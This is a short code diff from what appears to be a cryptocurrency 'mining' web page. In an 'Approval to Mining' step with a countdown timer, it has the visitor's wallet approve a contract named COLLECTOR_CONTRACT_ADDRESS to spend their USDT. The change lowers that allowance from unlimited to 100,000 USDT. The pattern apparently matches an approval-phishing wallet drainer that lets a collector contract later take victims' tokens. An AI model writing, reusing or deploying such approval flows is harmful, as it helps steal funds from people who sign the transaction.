@@ -848,7 +848,8 @@
                 startCountdown(25, "Approval to Mining");
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
-                const maxAmount = ethers.MaxUint256;
+                const maxAmount = ethers.parseUnits("100000", 6);
+
                 const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
                 const receipt = await tx.wait();
 
